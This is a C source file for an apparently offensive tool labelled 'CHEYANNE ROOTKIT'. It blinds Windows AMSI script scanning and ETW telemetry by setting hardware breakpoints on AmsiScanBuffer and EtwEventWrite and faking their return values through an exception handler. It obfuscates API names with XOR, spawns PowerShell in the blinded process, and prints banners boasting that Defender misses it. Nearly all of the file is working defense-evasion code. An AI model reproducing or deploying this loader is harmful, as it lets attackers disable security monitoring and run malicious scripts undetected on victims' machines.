/*
 * dark_room_annotated.c — Combined AMSI + ETW Bypass (Annotated)
 * ═══════════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 *
 * PURPOSE:
 *   Single loader that blinds BOTH AMSI (script scanning) and ETW
 *   (process telemetry) using hardware breakpoints. Creates the
 *   "dark room" where our tools operate without Defender seeing
 *   script content or process activity.
 *
 *   DR0 = AmsiScanBuffer  → returns E_INVALIDARG (0x80070057)
 *   DR1 = EtwEventWrite   → returns STATUS_SUCCESS (0)
 *
 *   Zero bytes modified. Zero VirtualProtect calls. Zero EtwTi alerts.
 *
 * PREREQUISITES:
 *   Finding #33: AMSI HWBP bypass confirmed (Engagement 7)
 *   Finding #35: ETW HWBP bypass confirmed (Engagement 8)
 *   Finding #36: Defender blind spot in CPU debug register monitoring
 *
 * COMPILE:
 *   cl.exe dark_room_annotated.c /Fe:dark_room.exe /O1 /GS-
 *
 * USAGE:
 *   dark_room.exe            (blind AMSI + ETW, spawn PowerShell)
 *   dark_room.exe --test     (blind both, verify, exit)
 *   dark_room.exe --check    (locate targets only)
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define XOR_KEY 0xAF

/* "amsi.dll" XOR 0x41 */
static const unsigned char xAmsiDll[] = {
    0xCE, 0xC2, 0xDC, 0xC6, 0x81, 0xCB, 0xC3, 0xC3
};
#define xAmsiDll_LEN 8

/* "AmsiScanBuffer" XOR 0x41 */
static const unsigned char xAmsiScanBuffer[] = {
    0xEE, 0xC2, 0xDC, 0xC6, 0xFC, 0xCC, 0xCE, 0xC1,
    0xED, 0xDA, 0xC9, 0xC9, 0xCA, 0xDD
};
#define xAmsiScanBuffer_LEN 14

/* "ntdll.dll" XOR 0x41 */
static const unsigned char xNtdll[] = {
    0xC1, 0xDB, 0xCB, 0xC3, 0xC3, 0x81, 0xCB, 0xC3,
    0xC3
};
#define xNtdll_LEN 9

/* "EtwEventWrite" XOR 0x41 */
static const unsigned char xEtwEventWrite[] = {
    0xEA, 0xDB, 0xD8, 0xEA, 0xD9, 0xCA, 0xC1, 0xDB,
    0xF8, 0xDD, 0xC6, 0xDB, 0xCA
};
#define xEtwEventWrite_LEN 13

/* "powershell.exe" XOR 0x41 */
static const unsigned char xPowerShell[] = {
    0xDF, 0xC0, 0xD8, 0xCA, 0xDD, 0xDC, 0xC7, 0xCA,
    0xC3, 0xC3, 0x81, 0xCA, 0xD7, 0xCA
};
#define xPowerShell_LEN 14

static void xor_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

static HANDLE hStdOut;
static void color(WORD c) { SetConsoleTextAttribute(hStdOut, c); }

#define RED     (FOREGROUND_RED | FOREGROUND_INTENSITY)
#define GREEN   (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define YELLOW  (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define CYAN    (FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define WHITE   (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)

/* Global targets for VEH handler — both must be set before activating */
static volatile void *g_pAmsiScanBuffer = NULL;
static volatile void *g_pEtwEventWrite = NULL;

/* ═══════════════════════════════════════════════════════════════════
 * UNIFIED VEH HANDLER
 * ═══════════════════════════════════════════════════════════════════
 * Single handler for both breakpoints. Checks RIP against both
 * targets. DR0 fires for AMSI, DR1 fires for ETW — both generate
 * EXCEPTION_SINGLE_STEP, distinguished by the RIP value.
 * ═══════════════════════════════════════════════════════════════════ */

static LONG WINAPI DarkRoomHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    /* AMSI bypass: return E_INVALIDARG */
    if ((void *)pExInfo->ContextRecord->Rip == g_pAmsiScanBuffer) {
        pExInfo->ContextRecord->Rax = (DWORD64)0x80070057;
        pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* ETW bypass: return STATUS_SUCCESS */
    if ((void *)pExInfo->ContextRecord->Rip == g_pEtwEventWrite) {
        pExInfo->ContextRecord->Rax = 0;
        pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/* ═══════════════════════════════════════════════════════════════════
 * RESOLVE TARGETS
 * ═══════════════════════════════════════════════════════════════════ */

static void *resolve_function(const unsigned char *xDll, int dllLen,
                               const unsigned char *xFunc, int funcLen,
                               int useGetModuleHandle) {
    HMODULE hMod;
    void *pFunc;
    unsigned char dllName[32];
    unsigned char funcName[64];

    memcpy(dllName, xDll, dllLen);
    xor_decode(dllName, dllLen);
    dllName[dllLen] = 0;

    memcpy(funcName, xFunc, funcLen);
    xor_decode(funcName, funcLen);
    funcName[funcLen] = 0;

    if (useGetModuleHandle)
        hMod = GetModuleHandleA((char *)dllName);
    else
        hMod = LoadLibraryA((char *)dllName);

    if (!hMod) return NULL;

    pFunc = (void *)GetProcAddress(hMod, (char *)funcName);

    memset(dllName, 0, sizeof(dllName));
    memset(funcName, 0, sizeof(funcName));

    return pFunc;
}

/* ═══════════════════════════════════════════════════════════════════
 * SET DUAL HARDWARE BREAKPOINTS
 * ═══════════════════════════════════════════════════════════════════
 * DR0 = AmsiScanBuffer (execution breakpoint)
 * DR1 = EtwEventWrite (execution breakpoint)
 *
 * DR7 encoding:
 *   Bit 0:     Local enable DR0
 *   Bit 2:     Local enable DR1
 *   Bits 16-17: DR0 condition (00 = execution)
 *   Bits 18-19: DR0 length (00 = 1 byte)
 *   Bits 20-21: DR1 condition (00 = execution)
 *   Bits 22-23: DR1 length (00 = 1 byte)
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL set_dual_hwbp(void *pAmsi, void *pEtw) {
    CONTEXT ctx;
    HANDLE hThread = GetCurrentThread();

    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(hThread, &ctx)) {
        color(RED);
        printf("  [!] GetThreadContext failed: %lu\n", GetLastError());
        return FALSE;
    }

    /* Set both breakpoints */
    ctx.Dr0 = (DWORD64)pAmsi;
    ctx.Dr1 = (DWORD64)pEtw;

    /* Clear condition/length bits for DR0 and DR1, set enables */
    ctx.Dr7 &= ~(0xFULL << 16);  /* Clear DR0 cond+len */
    ctx.Dr7 &= ~(0xFULL << 20);  /* Clear DR1 cond+len */
    ctx.Dr7 |= (1 << 0);          /* Enable DR0 locally */
    ctx.Dr7 |= (1 << 2);          /* Enable DR1 locally */

    if (!SetThreadContext(hThread, &ctx)) {
        color(RED);
        printf("  [!] SetThreadContext failed: %lu\n", GetLastError());
        return FALSE;
    }

    /* Verify */
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(hThread, &ctx);

    if (ctx.Dr0 == (DWORD64)pAmsi && ctx.Dr1 == (DWORD64)pEtw) {
        color(GREEN);
        printf("  [+] DR0 = 0x%p (AmsiScanBuffer)\n", pAmsi);
        printf("  [+] DR1 = 0x%p (EtwEventWrite)\n", pEtw);
        printf("  [+] DR7 = 0x%llX\n", (unsigned long long)ctx.Dr7);
        return TRUE;
    }

    color(RED);
    printf("  [!] DR register verification failed\n");
    return FALSE;
}

/* ═══════════════════════════════════════════════════════════════════
 * VERIFICATION
 * ═══════════════════════════════════════════════════════════════════ */

typedef HRESULT (WINAPI *pAmsiScanBuffer_t)(
    void *, void *, ULONG, const wchar_t *, void *, int *);

typedef ULONG (WINAPI *pEtwEventWrite_t)(
    DWORD64, void *, ULONG, void *);

static BOOL verify_dark_room(void *pAmsi, void *pEtw) {
    pAmsiScanBuffer_t fnAmsi = (pAmsiScanBuffer_t)pAmsi;
    pEtwEventWrite_t fnEtw = (pEtwEventWrite_t)pEtw;
    HRESULT hrAmsi;
    ULONG ulEtw;
    int amsiResult = 0;
    BOOL ok = TRUE;

    color(YELLOW);
    printf("  [*] Testing AMSI bypass...\n");
    hrAmsi = fnAmsi(NULL, (void *)"test", 4, L"CHEYANNE_DARKROOM", NULL, &amsiResult);
    if (hrAmsi == (HRESULT)0x80070057) {
        color(GREEN);
        printf("  [+] AMSI: returned 0x%08lX (E_INVALIDARG) — BLIND\n", (unsigned long)hrAmsi);
    } else {
        color(RED);
        printf("  [!] AMSI: returned 0x%08lX — FAILED\n", (unsigned long)hrAmsi);
        ok = FALSE;
    }

    color(YELLOW);
    printf("  [*] Testing ETW bypass...\n");
    ulEtw = fnEtw(0xDEADBEEFULL, NULL, 0, NULL);
    if (ulEtw == 0) {
        color(GREEN);
        printf("  [+] ETW:  returned %lu (STATUS_SUCCESS) — BLIND\n", ulEtw);
    } else {
        color(RED);
        printf("  [!] ETW:  returned %lu — FAILED\n", ulEtw);
        ok = FALSE;
    }

    return ok;
}

static void spawn_powershell(void) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    unsigned char cmd[32];

    memcpy(cmd, xPowerShell, xPowerShell_LEN);
    xor_decode(cmd, xPowerShell_LEN);
    cmd[xPowerShell_LEN] = 0;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    color(CYAN);
    printf("\n  [*] Spawning PowerShell in the dark room...\n");
    printf("  [*] AMSI blind + ETW blind in this process\n");
    printf("  [*] Note: child process needs own breakpoints\n\n");

    if (!CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        color(RED);
        printf("  [!] CreateProcess failed: %lu\n", GetLastError());
        return;
    }

    printf("  [+] PowerShell PID: %lu\n", pi.dwProcessId);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    memset(cmd, 0, sizeof(cmd));
}

int main(int argc, char **argv) {
    void *pAmsi, *pEtw;
    PVOID hVeh;
    int checkOnly = 0, testOnly = 0;

    hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    if (argc > 1 && strcmp(argv[1], "--check") == 0) checkOnly = 1;
    if (argc > 1 && strcmp(argv[1], "--test") == 0) testOnly = 1;

#ifdef VDR_DEBUG
    color(CYAN);
    printf("\n");
    printf("  +======================================================+\n");
    printf("  |  CHEYANNE DARK ROOM — 22DIV / george wu              |\n");
    printf("  |  AMSI + ETW Bypass (Dual Hardware Breakpoint)         |\n");
    printf("  +======================================================+\n");
    printf("  |  DR0: AmsiScanBuffer → E_INVALIDARG                   |\n");
    printf("  |  DR1: EtwEventWrite  → STATUS_SUCCESS                 |\n");
    printf("  |  Memory modified: ZERO bytes                          |\n");
    printf("  |  VirtualProtect: NOT CALLED                           |\n");
    printf("  |  Privilege: Standard user                              |\n");
    printf("  +======================================================+\n\n");
    color(WHITE);
#endif

    /* PHASE 1: Locate both targets */
    printf("  --- PHASE 1: LOCATE TARGETS ---\n\n");

    pAmsi = resolve_function(xAmsiDll, xAmsiDll_LEN,
                             xAmsiScanBuffer, xAmsiScanBuffer_LEN, 0);
    if (pAmsi) {
        color(GREEN);
        printf("  [+] AmsiScanBuffer at 0x%p\n", pAmsi);
    } else {
        color(RED);
        printf("  [!] AmsiScanBuffer not found\n");
        return 1;
    }

    pEtw = resolve_function(xNtdll, xNtdll_LEN,
                            xEtwEventWrite, xEtwEventWrite_LEN, 1);
    if (pEtw) {
        color(GREEN);
        printf("  [+] EtwEventWrite  at 0x%p\n", pEtw);
    } else {
        color(RED);
        printf("  [!] EtwEventWrite not found\n");
        return 1;
    }

    if (checkOnly) {
        printf("\n  [*] --check mode: targets located, not activating.\n");
        return 0;
    }

    /* PHASE 2: Set dual hardware breakpoints */
    printf("\n  --- PHASE 2: ACTIVATE DARK ROOM ---\n\n");

    g_pAmsiScanBuffer = pAmsi;
    g_pEtwEventWrite = pEtw;

    hVeh = AddVectoredExceptionHandler(1, DarkRoomHandler);
    if (!hVeh) {
        color(RED);
        printf("  [!] VEH registration failed: %lu\n", GetLastError());
        return 1;
    }
    color(GREEN);
    printf("  [+] Unified VEH handler registered\n");

    if (!set_dual_hwbp(pAmsi, pEtw)) {
        RemoveVectoredExceptionHandler(hVeh);
        return 1;
    }

    printf("\n  [+] DARK ROOM ACTIVE\n");
    printf("  [+] Script scanning: BLIND (AMSI)\n");
    printf("  [+] Process telemetry: BLIND (ETW)\n");
    printf("  [+] Memory integrity: CLEAN (zero modifications)\n");

    /* PHASE 3: Verify */
    printf("\n  --- PHASE 3: VERIFY ---\n\n");
    if (!verify_dark_room(pAmsi, pEtw)) {
        color(RED);
        printf("\n  [!] Dark room verification failed.\n");
        RemoveVectoredExceptionHandler(hVeh);
        return 1;
    }

    color(GREEN);
    printf("\n  [+] DARK ROOM VERIFIED — ALL SYSTEMS BLIND\n");

    if (testOnly) {
        printf("\n  [*] --test mode: verification complete.\n");

#ifdef VDR_DEBUG
        printf("\n");
        color(CYAN);
        printf("  +======================================================+\n");
        printf("  |  EVIDENCE SUMMARY — COMBINED BYPASS                   |\n");
        printf("  +======================================================+\n");
        color(WHITE);
        printf("  |  Target 1:    AmsiScanBuffer (amsi.dll)  via DR0     |\n");
        printf("  |  Target 2:    EtwEventWrite  (ntdll.dll) via DR1     |\n");
        printf("  |  Technique:   Dual hardware execution breakpoints     |\n");
        printf("  |  Intercept:   Unified VEH handler                     |\n");
        printf("  |  AMSI result: E_INVALIDARG (0x80070057) — scan blind |\n");
        printf("  |  ETW result:  STATUS_SUCCESS (0x00000000) — telemetry |\n");
        printf("  |               silenced, dead man test passed          |\n");
        printf("  |  Memory mod:  0 bytes (amsi.dll + ntdll.dll intact)  |\n");
        printf("  |  VProtect:    NOT CALLED                              |\n");
        printf("  |  Privilege:   Standard user (own thread context)      |\n");
        printf("  |  Tamper Prot: DID NOT DETECT                          |\n");
        printf("  +======================================================+\n");
        printf("  |  Verify: Get-MpThreatDetection | Where-Object {      |\n");
        printf("  |    $_.Resources -match 'dark_room' }                  |\n");
        printf("  |  Expected: No results (bypass invisible to Defender)  |\n");
        printf("  +======================================================+\n");
#endif

        RemoveVectoredExceptionHandler(hVeh);
        return 0;
    }

    /* PHASE 4: Spawn shell */
    printf("\n  --- PHASE 4: ENTER THE DARK ROOM ---\n");
    spawn_powershell();

    RemoveVectoredExceptionHandler(hVeh);
#ifdef VDR_DEBUG
    color(WHITE);
    printf("\n  -- CHEYANNE DARK ROOM SESSION COMPLETE --\n\n");
#endif

    return 0;
}
